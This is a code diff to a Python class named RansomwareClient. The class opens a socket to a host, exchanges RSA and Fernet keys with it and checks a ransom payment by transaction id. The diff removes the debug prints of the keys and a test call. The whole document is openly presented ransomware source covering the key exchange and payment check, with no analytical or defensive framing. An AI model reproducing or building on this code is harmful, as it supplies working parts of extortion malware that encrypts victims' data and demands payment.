@@ -11,11 +11,9 @@ class RansomwareClient:
         self.my_socket = socket()
         self.my_socket.connect((host, port))
         publickey, privatekey = rsa.newkeys(512)
-        print(publickey)
         self.my_socket.send(pickle.dumps((publickey, gethostname())))
         received_key = pickle.loads(self.my_socket.recv(1024))
         symmetric_key = rsa.decrypt(received_key, privatekey)
-        print(symmetric_key)
         self.fernet = Fernet(symmetric_key)
 
     def check_payment(self, transaction_id):
@@ -24,8 +22,3 @@ class RansomwareClient:
         answer = pickle.loads(self.fernet.decrypt(self.my_socket.recv(1024)))  # CODES:
         print("got answer")
         return answer
-
-
-c = RansomwareClient()
-print(c.check_payment("b605656f-5bad-51ec-b200-c368aeac3fbe"))
-print("Hello")
